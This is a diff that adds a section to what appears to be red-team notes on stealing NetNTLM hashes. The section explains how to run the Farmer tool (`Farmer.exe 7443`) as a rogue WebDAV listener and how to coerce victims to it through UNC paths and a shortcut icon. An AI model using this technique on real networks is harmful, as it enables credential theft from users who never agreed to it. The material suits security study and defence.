@@ -164,6 +164,24 @@ If we have a foothold in a network, we can do the following:
 * Start cracking the hashes
 * Hopefully profit
 
+## Farmer WebDav
+
+When inside a network, we can attempt to force hash leaks from other users by forcing them to authenticate to our WebDav server that we can bind to any an unused port without administrator privileges. To achieve this, we can use a tool called [Farmer](https://github.com/mdsecactivebreach/Farmer) by [@domchell](https://twitter.com/domchell?s=20).
+
+Below will make the farmer listen on port 7443:
+
+```text
+Farmer.exe 7443
+```
+
+Below shows how the Farmer successfully collects a hash for the user `spotless` when they are forced to authenticate to the malicious webdav when ls `\\spotless@7443\spotless.png` is executed:
+
+![](../../.gitbook/assets/image%20%28791%29.png)
+
+Below shows how the Farmer successfully collects a hash from user `spotless` via a shortcut icon that points to our malicious webdav at `\\spotless@3443\spotless.png`:
+
+![](../../.gitbook/assets/harvest-hash-shortcut.gif)
+
 ## References
 
 {% embed url="http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf" %}
@@ -179,4 +197,8 @@ If we have a foothold in a network, we can do the following:
 {% embed url="https://twitter.com/bohops/status/1062935197107322880?s=12" %}
 
 {% embed url="https://www.securify.nl/blog/SFY20180501/living-off-the-land\_-stealing-netntlm-hashes.html" %}
+
+{% embed url="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/" %}
+
+
 
